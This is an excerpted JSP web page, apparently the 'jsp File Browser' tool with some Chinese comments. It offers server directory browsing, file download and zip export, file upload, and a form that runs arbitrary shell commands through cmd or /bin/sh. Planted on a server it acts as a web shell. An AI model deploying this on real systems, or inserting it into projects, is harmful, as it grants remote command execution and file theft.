...
<%!
  ...
  */
  ...
  //private static final String RESTRICT_PATH = "D:\\Tomcat"; //Win32: Case important!!
  ...
  private static final String[] COMMAND_INTERPRETER = OS_NAME.startsWith("Windows") ? new String[]{"cmd", "/C"} : new String[]{"/bin/sh","-c"}; // Unix
  ...
  static String startProcess(String command, String dir) throws IOException {
    ...
    try {
      ...
      InputStreamReader  ls_in = new InputStreamReader (ls_proc.getInputStream());
      InputStreamReader  ls_err = new InputStreamReader (ls_proc.getErrorStream());
      boolean end = false;
      while (!end) {
        int c = 0;
        while ((ls_err.ready() ) && (++c <= 1000)) {
          ret.append(conv2Html(ls_err.read()));
        }
        c = 0;
        while ((ls_in.ready() ) && (++c <= 1000)) {
  ...
  static String dir2linkdir(String dir, String browserLink, int sortMode) {
    ...
    while (f.getParentFile() != null) {
      if (f.canRead()) {
        String encPath = URLEncoder.encode(f.getAbsolutePath().replace('\\', '/'));        
        buf.insert(0, "<a href=\"javascript:turnto('" + browserLink + "?sort=" + sortMode + "&amp;dir="
    ...
    if (f.canRead()) {
      String encPath = URLEncoder.encode(f.getAbsolutePath().replace('\\', '/'));
      buf.insert(0, "<a href=\"javascript:turnto(" + browserLink + "?sort=" + sortMode + "&amp;dir=" + encPath
...
<%    
    ...
    final String browser_name = uri;//request.getRequestURI();
    ...
    if (request.getParameter("Javascript") != null) {
      ...
      function turnto(URL, target){
        //location.href = URL+(URL.indexOf("?")!=-1?"&":"")+"rand=" + new Date().getTime();
        window.open(URL+(URL.indexOf("?")!=-1?"&":"")+"rand=" + new Date().getTime(), target?target:'_self');
      }
...
<%    }
    // View file
            ...
            if (!isAllowed(f, false)) {
                request.setAttribute("dir", f.getParent().replace('\\', '/'));
                ...
                if (isPacked(f.getName(), false)) {
                    ...
                    out.clearBuffer();
                    OutputStream out_s = new Writer2Stream(response.getOutputStream());
    ...
    // Download selected files as zip file
      ...
      if (notAllowedFile != null){
        ...
        out.clearBuffer();
        ZipOutputStream zipout = new ZipOutputStream(new Writer2Stream(response.getOutputStream()));
    ...
    // Download file
      ...
      if (!isAllowed(f, false)){
        ...
        response.setHeader("Content-Disposition", "attachment;filename=\"" + URLEncoder.encode(f.getName(), "UTF-8")//浏览器用UTF-8解析文件名滴
            + "\"");
    ...
    //else
      ...
      if (request.getAttribute("dir") == null) {
        ...
        request.setAttribute("dir", path.replace('\\', '/'));
      }%>
<html>
<head>
...
<%
        ...
        if(info==null){//可能刷新的时候，还没进入到上传(该死的，在写入的时候才开始监控)
          info = new UplInfo();
        }
...
Upload aborted.</body>
        ...
        %>
<META HTTP-EQUIV="Refresh" CONTENT="<%=UPLOAD_MONITOR_REFRESH%>;URL=<%=browser_name %>?uplMonitor=<%=URLEncoder.encode(fname, "UTF-8")%>">
</head>
<body>
<b>Upload of <%=fname%></b><br><br>
<center>
...
<body onLoad="oForm.command.focus();"><center>
<h2><%=LAUNCH_COMMAND %></h2><br />
<%
        out.println("<form name=\"oForm\" action=\"" + browser_name + "\" method=\"Post\">\n"
...
<%
    ...
    //Unpack file to the current directory without overwriting
      ...
      request.setAttribute("dir", root.replace('\\', '/'));
    ...
    if (dir_view && request.getAttribute("dir") != null) {
      ...
      if (!f.exists() || !isAllowed(f, false)) {
        ...
        if (isAllowed(f, false)) request.setAttribute("dir", f.getAbsolutePath().replace('\\', '/'));
...
<%
      ...
      out.print("<tr><th>&nbsp;</th><th title=\"Sort files by name\" align=left><a href=\"javascript:turnto('"
          + cmd + "&amp;sort=" + sort[0] + "')\">Name</a></th>"
          + "<th title=\"Sort files by size\" align=\"right\"><a href=\"javascript:turnto('" + cmd
          + "&amp;sort=" + sort[1] + "')\">Size</a></th>"
          + "<th title=\"Sort files by type\" align=\"center\"><a href=\"javascript:turnto('" + cmd
          + "&amp;sort=" + sort[3] + "')\">Type</a></th>"
          + "<th title=\"Sort files by date\" align=\"left\"><a href=\"javascript:turnto('" + cmd
      ...
      for (int i = 0; i < entry.length; i++) {
        ...
        if (!forbidden) {
          ...
          String name = URLEncoder.encode(entry[i].getAbsolutePath().replace('\\', '/'), "UTF-8");
          String buf = entry[i].getAbsolutePath();
          out.println(" &nbsp;<a href=\"javascript:turnto('" + browser_name + "?sort=" + sortMode
              + "&amp;dir=" + name + "')\">[" + buf + "]</a>");
      ...
      if (f.getParent() != null) {
        out.println("<tr class=\"mouseout\" onmouseover=\"this.className='mousein'\""
            + "onmouseout=\"this.className='mouseout'\">");
        out.println("<td></td><td align=left>");
        out.println(" &nbsp;<a href=\"javascript:turnto('" + browser_name + "?sort=" + sortMode + "&amp;dir="
            + URLEncoder.encode(f.getParent().replace('\\', '/'), "UTF-8") + "')\">" + FOL_IMG + "[..]</a>");
        out.print("</td><td>&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td><td></td></tr>");
      }
      ...
      if (entry != null && entry.length > 0) {
        ...
        for (int i = 0; i < entry.length; i++) {
          ...
          String ahref = "<a onmousedown=\"dis()\" href=\"javascript:turnto('" + browser_name + "?sort="
              + sortMode + "&amp;";
          ...
          if (entry[i].isDirectory()) {
            ...
            if (entry[i].canRead()) {
              ...
              if (USE_POPUP) link = ahref + "file=" + name + "', '_blank')\">"// target=\"_blank\"
                  + buf + "</a>";
